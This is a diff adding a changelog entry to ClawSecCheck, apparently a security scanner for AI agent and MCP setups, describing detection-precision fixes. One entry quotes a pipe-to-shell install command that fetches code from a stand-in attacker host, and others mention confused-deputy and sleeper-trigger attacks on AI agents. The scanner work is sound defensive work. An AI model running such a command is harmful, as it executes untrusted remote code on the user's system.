@@ -3,6 +3,41 @@
 All notable changes to ClawSecCheck are documented here.
 Format follows [Keep a Changelog](https://keepachangelog.com/); versions use [SemVer](https://semver.org/).
 
+## [3.26.0] — 2026-07-08
+
+R14 — detection engine precision: four cases where the taint simulator, RISK
+engine, or content-ring regexes disagreed with reality or with each other.
+
+### Fixed
+- **Taint simulator now tracks `with ... as VAR:` blocks.** Previously
+  `EffectSimulator.simulate_statement()` had no case for `ast.With`/`ast.AsyncWith`,
+  so file/network operations written with the idiomatic context-manager form
+  (`with open(...) as f:`, `with urlopen(...) as resp:`) were invisible to the
+  capability profiler — reported `false` (safe) when the truth was `true`. This
+  fed a false-safe `--emit-manifest` and the vet capability axis. Now propagates
+  taint through the `withitem` binding and recurses into the body normally.
+- **B24 (full-audit MCP hardening) now matches `--vet-mcp`'s severity on a
+  pipe-to-run install vector** (e.g. `bash -c "curl http://evil.example/x | bash"`).
+  Previously the default `clawseccheck` audit only WARNed on this shape while
+  `--vet-mcp` correctly FAILed it — same input, opposite verdict depending on
+  entry point. Ordinary curl-with-URL (no pipe-to-shell) still stays WARN.
+- **B47/RISK-11 no longer fire for a monolithic single-agent trifecta** just
+  because the attestation happens to declare *any* unrelated delegation edge
+  elsewhere in the roster. An entry agent that traverses zero outgoing edges can
+  no longer fabricate a cross-agent "confused deputy" chain — that case is B45's
+  territory (no privilege separation), not a reassembly finding. Genuine
+  cross-agent chains (an untrusted-input agent actually traversing a
+  non-structural-wall edge) are unaffected.
+- **B65 (conditional sleeper-trigger) no longer false-fires on ordinary API
+  documentation.** A backtick-quoted parameter value like `` `action="open"` ``
+  is no longer counted as a live action-verb match, and "later" is no longer
+  treated as a delay/persistence signal when it's just describing ordinary
+  API-call sequencing ("...in later calls"). Genuine sleeper-trigger phrasing
+  (persistence framing like "from now on") still fires.
+
+### Changed
+- _TODO_
+
 ## [3.25.0] — 2026-07-08
 
 R13 — vet-surface false negatives: three cases where `--vet*` either missed real
